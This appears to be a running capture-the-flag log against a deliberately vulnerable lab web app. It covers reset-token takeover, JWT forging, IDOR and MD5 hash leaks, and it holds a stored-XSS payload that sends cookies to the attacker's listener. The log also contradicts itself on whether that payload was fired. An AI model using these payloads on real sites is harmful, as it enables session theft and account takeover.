# Darkly 42 — Walkthrough (running log)

Target: `http://192.168.1.74:4942` (pedagogical exercise, user's own LAN VM)
Attacker machine LAN IP: `192.168.1.63`

## Flags found so far: 5

| # | Flag | Where | Vulnerability |
|---|------|-------|----------------|
| 1 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | `/api/grades` (as any authenticated user, via forged JWT) | JWT secret disclosure → forged session |
| 2 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | `/staff/dashboard` banner, after self role-escalation | Unrestricted `role` field in `PATCH /api/profile` |
| 3 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | `/profile/{wil's id}` → "Private note" card | IDOR — any user's profile page/`private_note` viewable by id |
| 4 | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | `/api/users/{id}` → `recovery_code` field (benjamin/dorian/thanos) | Same IDOR, surfaces that reset tokens are MD5-based (predictable) |
| 5 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | Exfiltrated from the moderation bot's `flag` cookie | Stored XSS in forum comments + privileged bot visits new threads with a non-httpOnly `flag` cookie |

Bonus from flag 5's exfil: also captured the **moderator's live session JWT**
(`login: moderator`, `role: student` — so the bot account itself is only
`student`-level; its privilege must come from something else, e.g. a
server-side bot process rather than the cookie's role claim). Not yet explored
further — see Open paths.

(None of these 5 is confirmed yet to be one of the "4 that open the way to
admin" — see Open paths below.)

## Step-by-step walkthrough

### 1. Initial recon
- Fetched `/` — HTML comments from "wil / emilie / sophie" hint at: SQLi history ("fixed, probably"), hardcoded "online students" counter, more hints "if you read HTML source for fun, you'll love this project."
- Footer `DEPLOY LOG` comment (present on **every** page) discloses: JWT secret history — `"42"` → `"42network"` (current).
- Response headers leak internals: `x-pocketbase: http://localhost:8090`, `x-42-internal: campus=paris`.
- `robots.txt` disallows (= points to): `/admin`, `/staff`, `/internal`, `/backup`, `/api/grades`, `/_/`, `/static/uploads/`.
- `/static/js/console_eggs.js` (loaded on every page) has a `window.darkly42` console helper (`hint()`, `whoami()`, `wil()`, `sophie()`, `version()`) — flavor/hints, plus a `jwtDecode()` helper confirming session is a JWT.
- Login page console logs hint: "md5 is not security. some accounts have predictable passwords" + a keyboard easter egg revealing text "psst — jdoe still hasn't changed that password".
- `/reset-password` page reveals the expected email format: `you@student.42.tech`.

### 2. Finding 01 — Password reset token disclosure → account takeover (CRITICAL)
- `POST /reset-password/request` returns the reset token **directly in the `Location` redirect header**, for *any* email (existing or not):
  `location: /reset-password?email=...&token=<32-hex>`
- Used the leaked token against `jdoe@student.42.tech` → `POST /reset-password/confirm` with `new_password` → `302 success` → logged in as `jdoe`, got a real `session` JWT cookie (role: `student`).
- File: `findings/01-password-reset-token-disclosure.md` + `repro-01-reset-takeover.sh`.

### 3. Finding 02 — JWT secret disclosure → forged session → FLAG 1
- Session JWT: header `{"alg":"HS256"}`, payload `{"sub","login","role","exp"}`.
- Signed a forged token with the disclosed secret `"42network"` and arbitrary `role` → accepted by server (`/api/grades`, `/agenda` flipped 302→200).
- `GET /api/grades` (with any valid session) returns **all** of that user's grade rows, including a "Darkly" meta-project (module: Security, `real_42: false`) whose `flag` field = **FLAG 1**.
- Note: `/admin` still 403 "Insufficient privileges" even with forged `role: admin/staff` — gated by something else (not purely the JWT claim).
- File: `findings/02-jwt-secret-forgery-flag1.md`.

### 4. Finding 03 — Self role-escalation via `PATCH /api/profile` → FLAG 2
- `PATCH /api/profile {"role": "..."}`: `staff`/`admin` rejected ("role not assignable"), but `cadet` is accepted and **persists** server-side.
- After re-login (JWT is cached, must refresh), `cadet` role unlocked `/staff` and `/staff/dashboard` (nav shows "Staff area", privilege ladder: Visitor → Student → **Staff campus** (reached) → Staff 42Network → Staff 42).
- Dashboard banner directly contains **FLAG 2**.
- Dashboard also exposed:
  - `GET /api/users` — full user directory (no real privilege check, just "logged in").
  - `GET /api/docs-internal` — API schema: `role_values: [visitor, student, cadet, staff, god]`, confirms `role` writable via PATCH, and `grades` has a `student` query filter.
  - Links to `/projects/download?file=...` (download endpoint, param name = `file`) and PocketBase admin UI at `http://localhost:8090/_/`.
  - HTML comment: "sophie: fix the XSS in the forum comments first" + "the XML agenda import endpoint is not validated server-side" (XXE hint).
- File: `findings/03-self-role-escalation-flag2.md`.

### 5. Finding 04 — IDOR on `/profile/{id}` and `/api/users/{id}` → FLAGS 3 & 4
- `/profile/{id}` (HTML) and `/api/users/{id}` (JSON) have **no ownership check** — any authenticated user (even just `cadet`) can view any other account's full record.
- wil's record (`id: k1asdfeditojrb4`): `private_note` field = **FLAG 3**. Also leaks `pw_hint` (full MD5 hash) for every user this way.
- benjamin/dorian/thanos's records: `recovery_code` field = **FLAG 4**, which also reveals that password-reset tokens are literally MD5 hashes (ties back to Finding 01).
- Confirmed `pw_hint` = `md5(current_password)` by checking jdoe's own hash against the password we set in Finding 01.
- File: `findings/04-profile-idor-flag3.md` (covers flag 3; flag 4 noted here, should fold into same file or new one — **TODO: write a dedicated finding file for flag 4 / recovery_code leak**).

### 6. In-progress / attempted, no result yet
- **Path traversal on `/projects/download?file=`**: endpoint blocks any request containing literal `..` (403 "forbidden") regardless of encoding (`%2e%2e`, double-encoding `%252e`, backslashes, `a/../..`) — these either get blocked (403) or fail silently (404, filename-not-found) because the handler doesn't double-decode. Tried the dashboard's listed PDFs (`staff_guide.pdf` works, 77 bytes, mentions `/internal/config`; `eval_grid.pdf`/`campus_map.pdf`/`bh_calculator.pdf` → 404, don't actually exist on disk; `faq_darkly.pdf` → 25-byte placeholder, no hidden note despite the comment hinting one). **Likely a red herring** (the HTML banter deliberately misdirects) — not fully ruled out, but no traversal bypass found yet.
- **MD5-cracking wil's/sophie's real passwords** (`pw_hint`): got full hashes —
  - wil: `016e483f01da7285d2fd73a688656cb9`
  - sophie: `8158c9a4d583ee162be6424638c56a01`
  - moderator: `372c7937eb6ebb8871d1c464eda768d8`
  - emilie: `049d9ed7258da4d4beda626ff522f53e`
  Tried ~1200 dictionary guesses (names/campus/brand words × common suffixes) — **no hit yet**. Needs a bigger wordlist or a different angle (maybe not meant to be brute-forced; "predictable passwords" might refer to something more specific, e.g. a leak elsewhere).
- **Stored XSS in forum comments**: confirmed exploitable — `POST /forum/{id}/comment` with `content` field renders raw HTML ("HTML is supported for formatting", confirmed by site's own comments). Forum thread hint: *"the moderation bot opens every thread with a live session... and a 'flag' cookie that isn't httpOnly"* — strongly implies posting an XSS payload will get a privileged bot to visit and leak its cookie.
  - Started a local exfil listener on this machine: `python3 /tmp/xss_listener/server.py` on port 8888 (logs to `/tmp/xss_listener/hits.log`), reachable from the target VM at `192.168.1.63:8888` since both are on the same `192.168.1.0/24` LAN.
  - **Not yet fired** — paused here before posting the actual payload.

## Open paths / next steps (in priority order)

1. **Fire the stored-XSS cookie-theft payload** against the forum moderation bot (listener already running at `192.168.1.63:8888`). Likely payload:
   ```html
   <img src=x onerror="fetch('http://192.168.1.63:8888/c?'+encodeURIComponent(document.cookie))">
   ```
   Post via `POST /forum/{thread_id}/comment` with `content=<payload>`, wait, check `hits.log`.
2. **Reflected XSS on `/newsletter`** — subscribe form echoes the email back unescaped (per site comments) — not yet tried.
3. **XXE on the agenda XML import** (`/agenda`) — stdlib `xml.etree`, explicitly called out as "not validated server-side" — could read local files (maybe `/internal/config`, maybe app source) via external entities. Not yet tried.
4. **`/internal/config`** — explicitly "localhost only"; worth checking whether XXE (step 3) or the moderator bot (step 1) can be leveraged as an internal requester (SSRF-by-proxy) to read it, since we can't reach it directly (confirmed 403 from our vantage point).
5. **`/admin`** — still 403 "Insufficient privileges" with every forged/self-escalated role tried so far (`cadet`, `staff`, `admin` via forged JWT). Probably needs either: a real `staff`/`god` login (via cracking wil/sophie, or via the XSS bot-cookie theft), or a distinct bypass. This is likely gated behind the remaining "Staff 42Network" / "Staff 42" privilege-ladder tiers seen on the dashboard.
6. Finish writing up Finding 04b (the `recovery_code`/flag-4 leak) as its own file for completeness.

## Credentials / state established this session
- `jdoe@student.42.tech` / `Pwned1234!` — role `cadet` (escalated from `student`), valid session cookie saved in `/tmp/cookies_jdoe.txt`.
- Full user directory + MD5 `pw_hint` + `recovery_code` for all 9 accounts captured in `/tmp/out_dashboard.html` and various `/tmp/out_profile_*.html` / direct `curl` output above (not yet saved to a tidy file — **TODO: consolidate into a `findings/notes-userdata.md`**).
